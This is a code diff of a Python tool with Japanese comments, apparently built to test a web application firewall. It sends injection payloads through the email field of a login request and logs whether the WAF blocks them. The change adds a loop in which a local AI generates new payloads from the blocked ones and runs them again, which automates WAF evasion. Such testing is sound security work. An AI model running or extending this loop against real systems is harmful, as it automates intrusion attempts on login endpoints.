@@ -17,16 +17,26 @@ def main():
     a = input("攻撃結果ログを表示しますか？(y/n):")
     if a in["Y","y","yes"]:
         for i in logs:
-            print(f"攻撃ログ：{i}")
-    b = input("攻撃結果から新しい攻撃を生成しますか？(y/n):")
-    if b in["Y","y","yes"]:
-        anather_logs = red_local_ai.payload_ganerate(logs) #ローカルAI使用
-        # anather_logs = red_cloud_ai.payload_ganerate(logs) #クラウドAI使用
-    c = input("新しく生成された攻撃で攻撃を実行しますか？(y/n):")
-    if c in["Y","y","yes"]:
-        logs = payload_p(anather_logs)
-        for i in logs:
-            print(f"攻撃ログ：{i}")
+            print(f"攻撃ログ：{i}\n")
+    while True:
+        b = input("攻撃結果から新しい攻撃を生成しますか？(y/n):")
+        if b in["Y","y","yes"]:
+            #WAFでブロックされた攻撃ログのみを抽出し、新しい攻撃ペイロードを生成
+            blocked_logs = [log["ペイロード"] for log in logs if log["WAF"] == "Blocked" or log["ステータスコード"] == 500]
+            anather_logs = red_local_ai.payload_ganerate(blocked_logs) #ローカルAI使用
+            # anather_logs = red_cloud_ai.payload_ganerate(logs) #クラウドAI使用
+            c = input("新しく生成された攻撃で攻撃を実行しますか？(y/n):")
+            if c in["Y","y","yes"]:
+                logs = payload_p(anather_logs)
+                for i in logs:
+                    print(f"攻撃ログ：{i}\n")
+            else:
+                print("処理を終了します")
+                break
+        else:
+            print("処理を終了します")
+            break
+       
     # user_token,logs = attack_p(*payload) #payloadは複数の戻り値があるので*を使用
     # print("現在のWAF防御率は:",defence_rate(logs))
     # if user_token:
@@ -44,7 +54,10 @@ def payload_p(ai_reply):
     pass_payloads = "aaa"
     for i in email_payloads:
         print(f"\n実行中[email]:{i}---" )
-        payload = {"email":i,"password":pass_payloads}
+        payload = {
+                    "email":i,
+                    "password":pass_payloads
+                }
         response = requests.post(url,json=payload)
         #攻撃ステータスコードが403だったら記録
         if response.status_code == 403:
@@ -55,7 +68,7 @@ def payload_p(ai_reply):
                 "攻撃結果": False,
             }
             logs.append(recode)
-            print("攻撃がブロックされました")
+            print(f"インジェクション攻撃がブロックされました:status_code:{response.status_code}")
         elif response.status_code == 200:
             #WAFにブロックされず通過した場合ここで攻撃を記録
             recode = {
@@ -65,17 +78,17 @@ def payload_p(ai_reply):
                 "攻撃結果":True,
             }
             logs.append(recode) #logs配列に入れる
-            print("攻撃が成功しました")
+            print(f"インジェクション攻撃が成功しました:status_code:{response.status_code}")
         elif response.status_code == 500:
             #WAFにブロックされず通過した場合ここで攻撃を記録
             recode = {
                 "ペイロード": i,
                 "WAF":"Allowed",
                 "ステータスコード": response.status_code,
-                "攻撃結果":True,
+                "攻撃結果":False,
             }
             logs.append(recode) #logs配列に入れる
-            print("サーバーエラー")
+            print(f"脆弱性の検出に成功:status_code:{response.status_code}")
         else:
             recode = {
                 "ペイロード": i,
@@ -84,7 +97,7 @@ def payload_p(ai_reply):
                 "攻撃結果":False,
             }
             logs.append(recode) #logs配列に入れる
-            print("WAFは通過したが攻撃は失敗")
+            print(f"WAFは通過したがインジェクション攻撃は失敗:status_code:{response.status_code}")
     #攻撃ログをlogs.jsonファイルに書き込み
     with open("./Attacker/attack_logs.json","w",encoding="utf-8") as f:
         json.dump(logs,f,ensure_ascii=False,indent=4)
